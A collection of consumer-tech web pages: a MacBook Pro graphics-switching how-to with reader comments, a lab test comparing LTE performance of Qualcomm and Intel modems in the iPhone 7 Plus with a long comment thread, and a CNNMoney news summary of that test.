The feature is only available on MacBook Pros that have two graphics processing units (GPU). The reason it only exists on certain models of the MacBook Pro is not all Macs have dual GPUs, and the desktop Macs that do don’t need a low power mode since they don’t rely on batteries and are connected to a power source all the time. How to tell if you have dual GPUs You can tell if you have two GPUs by going to  → About this Mac → System Report → Graphics/Displays on your Mac. As you can see from my report, my 2012 15” MacBook Pro with Retina display has both an AMD Radeon M9 graphics card and the Intel Iris Pro integrated graphics: If you only see one graphics source in this list, it means you don’t have two graphics processing units. More than likely this is going to be the case if you have a lower end MacBook Pro. You might see some variant of Intel integrated graphics, whether it’s the Intel Iris Pro or Intel HD graphics. How Automatic Graphics Switching works Automatic Graphics Switching is a great feature because it helps give your Apple notebook phenomenal battery life. Without this feature, your power-hungry discreet graphics card would slide your battery life to a fraction of the time it lasts right now. Thanks to powerful software in your Mac, macOS is capable of detecting when your computer needs more graphical horsepower and it can seamlessly switch over to the discreet graphics card if you’re doing something graphic intensive, such as gaming. When you’re done, it moves back to the integrated graphics source to save power. When it does, your computer not only uses less juice, but it also runs much cooler and the fans will be quieter as they won’t have to spin so quickly to keep the machine cooler. Depending on how you use your MacBook Pro on a daily basis, you may or may not need to utilize the Automatic Graphics Switching setting. If you’re always tethered to a power source, then you might not care as much about the power efficiency of your MacBook Pro. This is typically the case with gamers who want the best graphical performance. These users don’t need Automatic Graphics Switching as much as a typical user and can let the computer run off of the discreet graphics card all the time because they’re typically connected to a power source to keep their game playing from killing their computer too quickly. On the other hand, if you want to turn it on to conserve power for an on-the-go lifestyle, like most people buy notebooks for, then this option should be important to you because you won’t want to waste battery life by using your discreet graphics card to render normal macOS interfaces and view video playback when you don’t need that kind of horsepower to drive that stuff. How to toggle Automatic Graphics Switching on or off To toggle Automatic Graphics Switching on or off, follow these simple steps: 1) Launch the System Preferences app on your Mac and open the Energy Saver preference pane. 2) Locate the Automatic Graphics Switching checkbox at the top of the preferences pan you see and add a check mark to toggle it on, or remove the check mark to toggle it off. The changes are going to take effect immediately after you make your choice. You don’t need to restart your computer. What did I just do? If you turned the feature off, then you’ve just made it so your Mac can utilize the high power discreet graphics card 100% of the time rather than using the power-sipping integrated graphics. Conversely, if you just turned the feature on, then your Mac can now save energy when it doesn’t need the high power graphics by switching to the low power graphics source instead, and this will yield improved battery life.

I’ve heard that the adhesive in the ipod that holds the battery is really difficult to get off among other things. leart terrible thing. have to remove everything ,, tons of screws … adhesive… and for the best, the battery is soldered on a very delicate place that if heated to much it’s damaged forever lol.. just changed the battery on one of my iphone 4.. it had 1100 cycles lol, in 3 minutes… 4/4s probably have the best quality build ever for a mobile phone leart https://uploads.disquscdn.com/images/59f2d1bced5bfc9b1e87af2b50e9ddb42fdf5581410a74860b2060438c3f9647.jpg Chris Owen 1,100 cycles wow lol. I agree the 4/4s was like brick that you couldn’t break lol leart 1100 cycles and still it was at 70-75% of designed battery life… a beast lol Chris Owen Man… lol Y2J: Keeper of the List Ah, glorious days leart sadly nothing is working on older firmwares anymore, that device was on 2.2.1.. even iTunes and AppStore was crashing lol 3.1.3 and up are still fine Mr_Coldharbour When everything about Apple and jailbreaking was intriguing. Now it’s all lost its flair. leart yeah… glorious days… that magic it lasted till iOS 6 i guess… obada I have a 2014 13″ Macbook Pro Retina and I don’t have dual graphics. What’s the deal here? Anthony Bouchard The option is only available on higher-end MacBook Pros, as noted in the post. I have the more expensive 15″ model. obada so bigger screen = “higher-end”?? Okay… Anthony Bouchard You can research Apple’s model lineup and specs here: http://www.apple.com/macbook-pro/ Daniel Waske Is there any way to disable the dGPU entirely? I’m asking because since Sierra even Apps like coconutBattery make my 2010 15″ MBP switch to the dGPU for no reason… Mr_Coldharbour You’re welcome. As for manually switching to the integrated GPU, if you only have one GPU then the app is rendered redundant because your Mac already has the one GPU which is already in itself power-efficient. Those apps / tools are made for those with multiple GPUs, hence the manual switching. I know that this is something everyone dreads, but have you considered restoring your HDD/SSD and starting over a fresh clean install of whatever current OS you have if you haven’t already done one recently? I hear Chrome (and flash – not to mention it’s unsafe for your system) is brutal on battery life on the majority of websites particularly those with video content probably have already switched to HTML5 so if you use Safari and you’re on OS 10.9.X Mavericks at the very least you should enjoy most websites flash-free which will be very lenient on battery life. Or stick with Opera or Firefox, but Chrome I hear and read is not the most battery-friendly web browser. And speaking of battery calibration, weekly calibrations is way too much, it is recommended no more than once a month. The idea is to have as little as charge cycles as possible. No need to obsess over it though. If you average about 80-100 charge cycles per year you’re good. Slightly more is not an issue but if you’re reaching the red every other day or every day then you’re wearing your battery out. As I said, if you work a lot from home or the same place and that Mac doesn’t go anywhere much, you game a lot, watch lots of videos, connecting to external displays, graphics intensive work or just overall your Mac is sitting on a desk and you work from that desk most of the time then leave it plugged in so long as you’re working from there and when you’re done unplug of course. Work from battery power about once a week. They say the battery is “happiest” when in the 20% to 80% range. Just as a reference, the MBP’s battery will retain about 80% of its overall health when it’s reached 1000 charge cycles. I hope this helps. e brake Thanks for the reply! And I guess the only option is for me to keep my MacBook Pro running optimal until the decision of upgrading becomes a possibility. I’m highly interested in the line up of new devices Apple debued last week. I restored my hdd earlier in the year, same time around when I used keystrokes to reset the pram and other settings. Lately I’ve seen my memory usage running a little higher in idle mode if you will so I’m currently looking into that as well. Usually if Opera is open and I’m casually navigating the web with a couple of open tabs my cpu usage would be around 8-12%, which is roughly 2-3gb of memory. Now it’s between a 4-4.5gb of memory with only one open app. I’ve obtain a couple of system defragmenter apps and already my memory usuage decreased to the normal limits. I’ve noticed that to maintain equipment or anything you intend to preserve and expect performance from, you need to do routine maintenance and become more familiar with the device/component to a strong sense to know how it’s suppose to operate the way you want it to.   Search Connect with iDownloadBlog Facebook Become a fan RSS Get the latest news YouTube Watch Us Twitter Stay up to date Newsletter News delivered to you Google+ Add us to your circle   The most recent headlines Daily Deals: $30 off Sony PlayStation 4 Pro, $70 off Beats Solo3 headphones, and more Apple seeds watchOS 3.1.1 beta 3 to developers Beloved butt-looking peach emoji is back in iOS 10.2 beta 3, looks even more like a butt Jony Ive discusses 20 years of iconic Apple designs and that pricey new coffee table book Apple removed nearly 50,000 apps from App Store in October   The latest jailbreak news Jailbreak tweaks of the week: EmojiSuggest, PasswordRecovery, & more… EmojiSuggest brings iOS 10-like emoji suggestions to the predictive keyboard WiJoin lets you know what Wi-Fi network you’re connected to PasswordRecovery stores passwords and recovers them when you forget them NCTextColor lets you add vibrancy to Notification Center iDownloadBlog           iDownloadblog.com About About Advertise Contact Keep in Touch Twitter Facebook RSS Feed Newsletter Push Notifications Podcasts Let's Talk iOS Let's Talk Jailbreak Site Stuff Disclosure Privacy Policy   Copyright iDownloadBlog 2016.

The combination of a premium build, unmatched system performance, and tightly integrated software and services delivers what’s considered to be the gold standard in smartphone user experience. Over the past five years, Apple’s modem supplier was Qualcomm, but this year, Apple has taken a different approach with the decision to source two instead of one baseband chipset suppliers: Qualcomm and Intel. This created two distinct RF SKUs, one limited to GSM/WCDMA/LTE support (A1778, A1784), powered by Intel’s modem, and one with GSM/CDMA/WCDMA/TD-SCDMA/LTE support (A1660, A1661) powered by Qualcomm’s modem.  On the one hand, most high-end flagship devices launched this year are powered by Qualcomm’s Snapdragon 820, with X12 Category 12 integrated modem (MDM9645M discrete part). The X12 modem is capable of up to 600Mbps peak downlink speeds, 3-Way Carrier Aggregation with 256 QAM, and also 4×4 MIMO on a single component carrier. Note that it is up to the smartphone manufacturers to decide which of these powerful capabilities will be integrated into their final product. The Verizon, Sprint and SIM Unlocked iPhone 7 and iPhone 7 Plus variants are powered by Qualcomm’s MDM9645M modem, accompanied by two transceivers: WTR3925 and WTR4905. Out of all supported features by Qualcomm’s solution, Apple has chosen to implement 3-Way Carrier Aggregation on the downlink and 2-Way Carrier Aggregation on the uplink for contiguous Band 7 or Band 41. Higher Order Modulation (DL-256QAM, UL-64QAM), and Higher Order MIMO (4×4 MIMO) have not been implemented. Therefore, the peak theoretical downlink speeds are limited to 450Mbps when aggregating three 20MHz wide LTE component carriers. We have achieved the maximum 450Mbps by aggregating 20MHz wide Band 20, Band 1, and Band 7. EVS (Enhanced Voice Services), also known as Ultra HD Voice, offers significantly improved audio quality, numerous efficiencies at the physical and IP layer, and is fully supported by Qualcomm’s modem. However, Apple has made a decision to disable this feature likely to level the playing field between the Qualcomm, and Intel varaints. On the other hand, the iPhone 7 represents Intel’s first major design win in a long time. In many ways this iPhone appears to be Intel’s make or break it in the cellular modem business. Similar to Samsung’s in house Shannon LTE modem found in Exynos based devices, Intel has decided to license CEVA DSP cores for the XMM7360 modem coupled with in-house SMARTi 5 RF Transceivers and X-PMU 736 RF Power Management. The Intel XMM7360 modem also supports 3-Way Carrier Aggregation on the downlink and 2-Way Carrier Aggregation on the uplink, but lacks support for EVS, DL-256QAM/UL-64QAM, 4×4 MIMO. Ironically, mobile operators such as T-Mobile USA and Telstra which have been offering these advanced LTE features, are being supplied with the iPhone 7 with the Intel modem. While there haven’t been a shortage of iPhone 7 unboxing videos, subjective camera reviews, and more, we have been hard pressed to find any meaningful mention of cellular performance. This goes for any other flagship device on the market. In this day and age with mobile internet consumption at the all time high, we believe that a mobile device is only as good as its ability to seamlessly connect and maintain its connectivity with the mobile network. Most of the time mobile operators get blamed for dropped calls or session timeouts, but it’s often forgotten that the phone OEMs implementation of baseband, RF Front-End (RFFE), and the antenna design could play its role. We have been using the Rohde & Schwarz (R&S) CMWflexx setup containing two R&S CMW500 and one R&S CMWC controller, as well as the R&S TS7124 RF Shielded Box with four Vivaldi antennas. This study has been done entirely independently, and Cellular Insights takes full responsibility for the analysis and opinions in this report. We have self-funded the procurement of iPhone 7 Plus units through commercial retail channels. All units have been preloaded with the latest version of iOS (10.0.3) Consistent with our previous reviews, our focus has been on measuring the highest achievable LTE throughput in clean channel state, starting at RSRP value of -85dBm, and incrementally reducing radiated power level while maintaining Block Error Rate (BLER) under 2%. This allows us to measure RF sensitivity of the device under test while eliminating inter-cell interference and fully controlling the radiated environment. This also allows for high reproducibility and consistency of our tests, and takes into account the performance of the entire RFFE subsystem.  We’ve tested three unique LTE frequency bands, Band 12 (10MHz), Band 4 (20MHz), and Band 7 (20MHz) in 4×2 MIMO configuration using Transmission Mode 4. While both devices achieved the maximum sustained data rates at the cell center, simulating edge of cell scenarios by reducing power level did cause each iPhone to display two very different personalities. As the device attaches to eNodeB, it reports its LTE capability. To get this out of the way, 4×4 MIMO and 256QAM features are not supported on the iPhone 7 Plus. FDD LTE Band 12 is part of the lower 700MHz band plan, covering 15 MHz of contiguous spectrum across three blocks (A, B, C). Most LTE Band 12 deployments are either 5 MHz or 10 MHz wide even though Band 12 can theoretically be deployed up to 15 MHz widths. Coincidentally, LTE Band 12 capable devices are only certified to support up to 10 MHz operation. As opposed to mid and high band spectrum, low frequency such as 700MHz Band 12 can propagate further, penetrate the concrete structure better, and often times is the only LTE layer reaching the device. For this particular reason, high sensitivity of a smartphone receiver is extremely important in challenging signal conditions, and it could make a difference between completing and dropping a VoLTE call. Both iPhone 7 Plus variants perform similarly in ideal conditions. At -96dBm the Intel variant needed to have Transport Block Size adjusted as BLER well exceeded the 2% threshold. At -105dBm the gap widened to 20%, and at -108dBm to a whopping 75%. As a result of such a huge performance delta between the Intel and Qualcomm powered devices, we purchased another A1784 (AT&T) iPhone 7 Plus, in order to eliminate any possibility of a faulty device. The end result was virtually identical. We are hoping that this sudden dip in performance at a specific RSRP value will be further investigated by the engineering and hopefully resolved. At -121dBm, the Intel variant performed more in line with its Qualcomm counterpart. Overall, the average performance delta between the two is in the 30% range in favor of the Qualcomm variant.  Band 4 is the most commonly deployed LTE spectrum band in North America, while Band 7 deployments are spread across the rest of the globe. Mid and high spectrum bands are used to densify LTE networks and provide incremental capacity. Just like during our Band 12 tests, the iPhone 7 Plus with the Intel modem continues to struggle even at relatively higher RSRP values with unexplainable sharp dips in performance. The gap between the two variants is consistent and north of 30% again in favor of the Qualcomm variant. To put this into perspective, we have compared the edge of cell performance of a few other flagship devices to see how these iPhones compare in less than favorable conditions In all tests, the iPhone 7 Plus with the Qualcomm modem had a significant performance edge over the iPhone 7 Plus with the Intel modem. We are not sure what was the main reason behind Apple’s decision to source two different modem suppliers for the newest iPhone. Considering that the iPhone with the Qualcomm modem is being sold in China, Japan and in the United States only, we can not imagine that modem performance was a deciding factor. When all said and done, the iPhone 7 Plus is a beautifully designed smartphone, with arguably the best-in-class camera and system performance. It’s also the best iPhone ever. We hope that next year’s iPhone delivers best-in-class LTE performance.  banner 25 prev postSamsung Galaxy S7, the first 4×4 MIMO smartphone Milan M.P. view all post Leave a comment Comments (72) Reviewer • 4 weeks ago This is a great article.

I know of reports on AT&T and Sprint, and some European carriers--in UK I think. Many, but not all, report 10.0.3 or 10.1 fixed this. reply alex logvin • 4 weeks ago Excellent article, Milan! Love the charts. reply Georgi Dimitrov • 3 weeks ago It would have been an excellent one, if power measurements have been conducted too. Without it, it's nothing more than politics. reply Travis • 4 weeks ago Yes please review the Pixel radio compared to other phones. Out of all the reviews I have seen online for the Pixel no one actually reviewed the "phone". After all we demand these devices work well when no WiFi is around. reply Thomas Anderson • 4 weeks ago Please do not review Google Pixel. I don't care the result of it. Thank you. reply Dazza • 4 weeks ago Please dont read the article on the Pixel. Thank you reply John • 4 weeks ago Any way to determine which variant is in my personal iPhone 7 plus? reply Steven H. • 4 weeks ago Yes, easily. The article noted which carriers are selling the one with the Qualcomm modem. If you bought it outright, was it for use on one of those carriers? reply Holger • 4 weeks ago The model number of your iPhone is printed on the back of the device. reply Brian B. • 4 weeks ago You can also find the model number by going to Settings > General > Regulatory. reply ilikemyprivacy • 4 weeks ago A few thoughts: 1. Thanks for doing this, so little information available on RF performance of phones which is so critical for performance, battery life, etc. 2. I would be interested to see you rerun this test with the iOS 10 Beta. The latest beta includes modem firmware 1.25.00 on the Qualcomm version which seems to help significantly with a variety of issues 3. If possible, it'd be great to look at a comparison for other RF front end features like envelope tracking, antenna tuning, etc. between the Intel and Qualcomm models as we.. reply Walt French • 4 weeks ago Great article; thanks. Maybe I missed it, but I didn't see in the article what features in the new Intel modem differed from the 6S's MDM9635M. As the comparison chart makes the two parts look very similar, what appears is that the 9645's new features are (today) a year ahead of the 9635 and the Intel part. reply Marcus • 4 weeks ago My question is the one with the Qualacom modem vs Intel was there any correlation between battery life too? If the qualacom works better does it use more battery power based on tests than the Intel. Just trying to gage it if i do decide to purchase a iPhone 7 reply Flash • 4 weeks ago Thanks for sharing. Was this test conducted using the latest update iOS 10.0.3 which includes a fix for a bug that could cause issues with cellular connectivity, a problem that only affected the new iPhone 7 and the iPhone 7 Plus? Thanks. reply Dazza • 4 weeks ago Yes. It says so in the article reply Tom • 4 weeks ago Great article, I really liked your introduction paragraph! reply Maxwell • 4 weeks ago Can you do a review on the ZTE Axon 7 signal strength and LTE performance please and thank you reply Prasad • 4 weeks ago Marcus, Assume you are downloading a file that is 70MB in size. If your iPhone with Qualcomm chip downloads this in half the time, it will be able to go to sleep that much faster. It is not necessary that the performance is obtained at the cost of power. reply VP • 4 weeks ago So if this is the case my iPhone 7 Plus purchased thru T-Mobile should not have any Verizon or Sprint connectivity. However when accessing carrier in settings it scans for available networks & finds T-Mobile, AT&T, Verizon & Sprint. It should not be possible due to hardware limitations. I couldn't get mine on release day even with pre-order. Could the demand & backlog have prompted Apple to add Qualcomm modems to all models? reply WiWavelength • 4 weeks ago VP, the available network scan on your 3GPP only baseband is detecting the LTE networks for VZW and Sprint, not their CDMA2000 networks. The latter use PRL based network selection, not user initiated network selection. AJ reply Eric • 4 weeks ago It would be great if you could provide a picture of the test setup. reply Yang • 4 weeks ago Without testing environment and setup specified, this type of comparison is less meaningful reply Jupiter Antunes • 4 weeks ago One important point must be kept in the picture, not only the modems makes the differences but the Antenna with the Modems. One significant information should be the Return Loss of the antenna scanning the channels in a Band. If a LAB is reading this could do it for us... thanks. reply Ehsan • 4 weeks ago Qualcomm should ask Apple for "Qualcomm Inside" sticker on the phones with Q chip. reply no • 4 weeks ago no reply Joe • 4 weeks ago If you swapped an Intel variant iPhone out at the Apple Store under warranty, would they supply you with another Intel or do they use the Qualcomm version for warranty replacements? reply Justin • 4 weeks ago Whenever you turn in a warranty claim, most likely you will receive a refurbished unit. Not a brand new one when you first buy/order. I would return it under the 30 day window and purchase another one personally. Although the phone is new, you could still potentially get a refurb reply Robert • 4 weeks ago It wold be interesting to see how the two different transceiver (RF + modem) compare in case of carrier aggregation that are in harmonic relationship, such as B12 as the primary carrier transmitting at 710 MHz and B4 as the secondary carrier with receive frequency at 2130. In this case the 3rd harmonic of the B12 transmitter lands right in B4 receiver thus potentially de-sensing it and degrading the throughput when the B12 TX power is high (cell-edge scenario). reply Ed • 4 weeks ago I am still waiting for Anandtech to do their digging. And offering some explanation to why. The Intel Modem is based on TSMC 28nm. Qualcomm X12 is on 20nm. ( Only the X16 is on 14nm FinET I believe ). X12 is / could be even better then the coming Intel offering 7480, which is STILL manufactured by TSMC. Why did Apple decide to use the newer X12 when they know the older MDM9635 was enough compared to Intel's 7360? Not supporting 4x4 MIMO in X12 was a rather simple decision because less then 10% of the network in the world support it, and no phone has yet to manage 4x4 MIMO inside. A some other details like X12 wasn't a true 4x4 MIMO and require separate chip to do so, while X16 is a true 4x4 MIMO. And I am pretty sure an Software update could make EVS possible. Whether or not they will do it is entirely different matter. What cost / patent issues are involved? reply Luka • 4 weeks ago How it could be achived more than 150M for SGS7edge on one carrier Band4? reply PD • 4 weeks ago 4X4 MIMO reply R • 4 weeks ago 2X2 MiMo single carrier using 64QAM is 75Mbps x 2... 150Mbps and 3CA with same config is 150Mbps x 3 giving 450Mbps peak.... too bad Apple did not use 256QAM! reply Luka • 3 weeks ago Then I would expect more than 180Mbps reply Bjoern • 4 weeks ago Nice rewiew, and measurements on the poewer drawn by both modules when performing differently? reply Mark • 4 weeks ago This is a great article. I happen to live in an area that gets marginal reception but I never knew it because I had a Nokia 928 from Verizon. When i finally had to trade it in after a couple of years, I tried the iphone 6S and found the reception to be horrible. I traded it in for a Galaxy S6 and was told "no more trades" so I was forced to keep it. That also had horrible reception at my house. My signal varies from -105 to -115 and calls constantly get dropped. My girlfriends Galaxy S5 worked great at my house and I took that as a sign as the antenna design changing in the Galaxies between the S5 and the S6...which I found to be true. When her phone was ready for replacement I searched around and found no bad things were said about the HTC10 reception. At my encouragement, she got the HTC 10 and gets great reception at my house. I have been searching for some sort of articles on antenna testing and this report is just what I was looking for. I would, however, like to see a wider range of phones tested. It would be interesting to see how that HTC10 does against the iphone and galaxy. And, I would also like to see how the new Droid Z and the Pixel fare. thank you again reply Alexander • 4 weeks ago Thank you for your effort, Milan. It would be nice to see the error bars on the graphs and the statistical comparison for the low signal LTE examples. Given the low average current networks speed limits (9-40 Gbs) it would be crucial to magnify graphs accordingly. I am going to use my phone mostly on the European GSM networks, so having A1661 with CDMA capability would not grant automatic CDMA network switch with European sim or ...?And of course after all it would be nice to prove the efficiency of your 30% discrepancy in real world or close to real world situation...What would be battery impact? reply John • 4 weeks ago The disabling of HD Voice - is it permanently disabled or is that a function that Apple could enable in the future? reply Adam • 4 weeks ago Lab test isn't field test. If you do field test,the results are almost same. reply Darrell Brand • 4 weeks ago Just called Apple and mentioned my concerns- I bought my iPhone 7 unlocked and no plan Apple has no response. reply landoncube • 3 weeks ago The SIM unlocked version is the Qualcomm modem, according to the article. reply JohnL • 3 weeks ago Only Qualcomm in the US and a couple of other places, it's Intel in Europe (1778 model is supplied as the unlocked one). reply JohnL • 4 weeks ago What was the modem firmware used in the tests please? Also IMHO worth repeating in 3-4 months to see if Intel have made significant improvements to a young product.. reply JohnL • 3 weeks ago I note 10.1 updates the modem firmware (Intel model) from 10.0.3's version 1.00.05 to 1.01..13, which seems like quite a bit. I don't know what was in 10.0.2 I'm afraid. reply JohnL • 2 weeks ago 10.1.1 takes it to 1.1.15 reply Jacq • 4 weeks ago This article made for great reading. A couple of things I would be interested in seeing in the future articles. 1. Testing this on Google's Pixel device along with every major flagship release. This is information that would influence a purchase decision. I also from daily use between the 5x and 6p felt the 5x was horrible and which you tested the 6p's signal as well, 2, Was there a measure of power consumption at the different signal strength between the two chipsets? Wondering if this affected the performance as well. Thanks - JSH reply Alessia Campoli • 4 weeks ago Good to see that iPhone 7 will be IP67 waterproof! When concerning about the waterproof function of mobile, I found an very interesting video about it. On this video, they drop VKworld T1 Plus, a budget 6.0-inch smartphone to the mud and clean it directly with water for long time, that is unbelivalble. reply VG • 4 weeks ago Even if you leave apart the intel vs qualcomm modem differences, the article clearly tells that SD 820 based devices will have far better connectivity as compared to any iPhone7 reply AP • 3 weeks ago If I'm on the AT&T network, is there anyway to check if I'm getting a Qualcomm version before I purchase/open the box? reply Alexis • 3 weeks ago the model number is written on the outside of the box. You could read it without breaking the seal or opening the box. The ATT model uses the Intel modem. If you want the qualcomm then buy a unlocked version reply landoncube • 3 weeks ago My research indicates that there is no AT&T Qualcomm phone available. I am looking into the SIM unlocked Qualcomm version for use on AT&T. reply Doug Lerner • 3 weeks ago I live in Tokyo and use KDDI Au. I can't find out which model they are using. AU shops say "it might be either, but you can't tell until purchasing and opening the box to look." All the floor models I've seen have the model number with the Intel chip though. I'm wondering how much of an issue this is and if I should upgrade my iPhone 6 Plus now. reply karyn • 3 weeks ago the model number is written on the outside of the box. You could read it without breaking the seal or opening the box. reply Doug Lerner • 3 weeks ago You're right! I can see that on the back of my iPhone 6 Plus box. That precludes being able to upgrade online, but perhaps I can do that in a store. Assuming there is even more than one model sold here in Japan for AU. I still haven't been able to confirm that yet. reply Kari • 3 weeks ago Let's wait a little and see what's Apple's response is, before jumping into conclusions. reply Doug Lerner • 3 weeks ago Actually, it turns out that the model sold here in Japan is neither the A1784 nor the A1661. For the iPhone 7 Plus it is the A1785. The details are at http://www.apple.com/jp/iphone-7/specs/ but the modem supports the following: FDD-LTE（バンド1、2、3、4、5、7、8、11、12、13、17、18、19、20、21、25、26、27、28、29、30） TD-LTE（バンド38、39、40、41） TD-SCDMA 1,900（F）、2,000（A） CDMA EV-DO Rev. A（800、1,900、2,100MHz） UMTS/HSPA+/DC-HSDPA（850、900、1,700/2,100、1,900、2,100MHz） GSM/EDGE（850、900、1,800、1,900MHz） I don't know if that means it's Qualcomm or Intel. The Japan model also supports FeliCa, which allows people to use it like Suica/Pasmo cards to ride the trains and subways. reply Pei • 3 weeks ago it's a qualcomm variant, not intel. reply Pei • 3 weeks ago this article has been seen in China. Only Qualcomm variants are sold here. Many apple users are not satisfied with APPLE because iPhone is expensive while Apple used a bad modem. reply JohnD • 3 weeks ago All devices with qualcomm have issues in the field. Lab vs field tests are completely different. The mobility tells how feasible a device is. Not speaking about the fact that in real NW the eNB will never give yous such a bandwidth. I really don't understand why you people struggle to have in the pocket the newest devices on the market... reply ElmCha • 3 weeks ago All Qualcomm devices have problems in the field? How so? Kindly elaborate. reply Alexhander • 3 weeks ago Great article! Very nicely detailed and accurate information based on the currently released iPhones. reply salman Khan • 3 weeks ago Both intel and Qualcomm modems are capable of supporting more than 400Mbps.if LTE network give them enough resources. and channel conditions are good. This means that performance of the intel modem may not be limitation here. It depends on test conditions, transport protocol parameters, both mobiles (Qualcomm and Intel) exact locations and many other factors. As a user, I dont care much if my downloading speed is 150Mpbs or 140Mpbs because I rarely run any application on my mobile phone that requires this much high data rate on my mobile(HD video stream needs few Mpbs speed). But I would be more interested in power comparison and battery life with these two modems. reply Bob H • 3 weeks ago My burning question is whether the inferior Intel modem I would get in my AT&T 7 Plus would also have inferior receptivity to my AT&T iPhone 6. If so, I will wait to upgrade until the 8. I already have spotty reception at home with my 6 and I can't afford to make it worse. Is there already a way to compare this or does it require a new test? Thanks. reply Bob H • 3 weeks ago I posted a question here that was held up for curation and then disappeared. It seemed perfectly harmless. What happened? reply Bob H • 3 weeks ago I had a chance to answer my question by doing a field test on my 6 at home and learning I was getting a reading of -114 in most places, and then bringing home a 7 Plus (with the inferior Intel modem) and getting readings between -108 and -112. Glad to learn that "inferior" doesn't mean worse than a 6, in my location at least, so I'll keep the 7 Plus. reply landoncube • 3 weeks ago Could you repeat the testing now that iOS 10.1 has been released? I have an A1784 iPhone 7 plus. reply JohnL • 3 weeks ago It is depressing how much my 1778 is slower than my 5s for LTE. A quick 4G test (or few) this evening gives 65.7MB/s down/14.1 up for the 5s and 60.0/6.5 for the 7... Plus I only tested it as I'd seen a trend so this wasn't a one-off. A bigger concern is the 5s holds onto a 4G signal much better, the 7 does like to be on 3G (iOS 10.1). reply Jos • 1 week ago There is a very interesting article about phone reception quality. Its writen by professor Gert Frølund Pedersen, from Denmark's Aalborg University. The direct link to the PDF: http://www.pts.se/upload/Rapporter/Tele/2016/MobilephoneTest2016-augusti-2016.pdf I ran some tests myself on the 3 Belgian providers. Reception quality inside my house is very bad where I live (bad coverage) with signal levels between -95 and -113 dBm. By the way, I'm an engineer and have quite some RF knowledge. Tested with a brand new iPhone 7 (Intel modem), iPhone SE, Nexus 5, Lumia 925 and Lumia 800 (both Lumia's are still Nokia design, not Microsoft). Tests are pure subjective, on different places in my house with all the phones and swapping SIM cards every time. With a signal of -95 dBm, the iPhone 7 often doesn't receive or can't make calls and text messages can't be send. More or less the same story with the iPhone SE. The Lumia's perform the best, the Nexus 5 sits between them. The Lumia's always have a better signal then the other phones. I don't care about LTE performance (I only get 3G at best over here) since I have Wifi in house. Don't understand why reviewers talk about all the gadgets of the phones, while the basic functionality (making phone calls) isn't even decently tested in an area with bad reception. Of course it's much more interesting to compare stuff like camera functionality, screen colours, quality of the Gorilla glass, bending phones etc, but it's all non-essential. I'd love to have a phone that bends when you sit on it, but at least has a good reception and can be used to make a call. Just want a phone with the best receiver sensivity. For each 3 dB decrease in level, the singal power is reduced by about one half. So a more sensitive phone just works better in environments with weak signals. That also includes using it in your car, a bad environment for a mobile phone (metal cage). And most of the time, the receiver in the phone is not the problem, but the antenna plays a much bigger role... As professor Pedersen suggests in his article, it becomes time manufacturers are open about this in the specs of the phone. reply Massi • 6 days ago What process node is the Intel modem? Would be very interesting to see power comparison between Intel and Qualcomm reply Psymon • 2 days ago Great article.. I found it just in time! Having just purchased an iphone 7 plus, 32GB on contract in the UK for use on the Three network. Without any hesitation I have now returned the device and will wait until the i8 appears. Here's why... I live in a network fringe area of Cornwall and also trunk travel quite a bit. The fringe signal at home for the i7 displayed a significant decrease on the previous i5 and i5s signals. 4G has been incredibly sporadic everywhere had appeared to offer no performance increase over 3g. Another immediate issue was a very sharp spike in data usage, I have been using the Three, All You Can Eat Data plans for years, peaking at 25gb in the heaviest usage months... In just five operational days of the i7 the daily use started to top 3gb when streaming music, using google maps and general browsing, close to 50% more than I had ever seen before. I spoke with Three technical for a few hours, explaining everything in great detail, in an attempt to overcome the issues or at least gain a good explanation. Three almost immediately admitted that the 4g was not working on the i7 properly and a solution was being sought between Apple and Three (Apple deny this) Three technical suggested turning off the 4g until being advised of an update that resolves the issue. There was no explanation as to why the signal was poorer on the i7 compared to all previous devices, but now I am starting to understand why, your article makes perfect sense. The Data usage increase was also not met with a good explanation but was dismissed by pointing out that I already have All You Can Eat Data, so why worry.. point taken... but be aware if you are paying for capped data limits! By the way the upgrade to iOS 10.1.1 has made no observable difference.! I also ran a performance test on the i7 using a little app "Performance Test" just to see whether the phone performed as advertised.. A friend also purchased an i7 with 256gb at the same time as me giving me the opportunity to compare both. What was remarkably disappointing was the write speeds... the read speeds were very similar but the write speed was significantly slower on my 32gb i7. Close to 50% less capable slowing the device down by 50% when writing to its memory. This was also observable when browsing images on both phone with maximum signal strength. (My friend has also retuned his iPhone 7 for the same reasons) As a final pass before returning the i7, with your article in hand, I made an appointment with Apple to see if they were prepared to shine some light on the issues. To be fair, they were not really interested, they did however offer me a replacement but with the Intel Model numbers. They confirmed that the Models with the Qualcomm component installed were not available in the UK. If you have an iPhone 7 with the model numbers A1778 or A1784 or are considering buying a new phone.. DON'T it really isn't worth the grief and they will be virtually worthless once the issues are widely known.. These phones WILL give you trouble, perhaps not so much in the city but rural and travelling they simply do not meet a price tag of £50.00 for a phone let alone £780.00 , they really are no more than just a very expensive camera/ipods. reply Cancel Reply Please be polite.

Justice denies Michigan's appeal to halt sex offender ruling News News There are two versions of the iPhone 7 -- and one is way slower Two different modems used By MATT MCFARLAND Posted: 3:08 PM, October 21, 2016 Updated: 3:13 PM, October 21, 2016 Stephen Lam/Getty Images WASHINGTON (CNNMoney) - All iPhones may look the same, but under the hood it's a different story. Some iPhone 7s use a Qualcomm modem, while others have an Intel modem. That distinction could make a difference in how fast an iPhone 7 Plus can send messages and load your favorite app. A new report from Cellular Insights found that the Qualcomm modem performed 30% better than Intel's. The researchers only tested the iPhone 7 Plus, but the two types of modems are also used in the iPhone 7. So how do you make sure you don't end up with the slower iPhone? If you have a Verizon, Sprint or SIM-free model, you're in good hands, according to the Cellular Insights report. Another preventive measure is to make sure you buy your phone in the United States, China or Japan. Those are the only countries where the speedy Qualcomm version is sold. Yet not every iPhone purchased in the U.S. has the faster modem. iPhones from T-Mobile, AT&T and Telstra include the Intel modem. To determine if your iPhone has the Intel modem, check the model number, found in small print on the back of your smartphone. The Intel modem is in Model A1778 and Model A1784. While the Intel modem is slower, it may not be slow enough to bother users. Cellular Insights ran comparison tests, showing that the Intel-powered iPhone 7 Plus was in the ballpark of the iPhone 6S in areas with poor reception. It's unclear why Apple is offering iPhones with two different speeds. The company did not immediately respond to a request for comment. Some reports have suggested that by shifting some of its modem business to a Qualcomm competitor, Apple gains leverage to extract better prices from Qualcomm. Copyright 2016 by CNN NewSource.

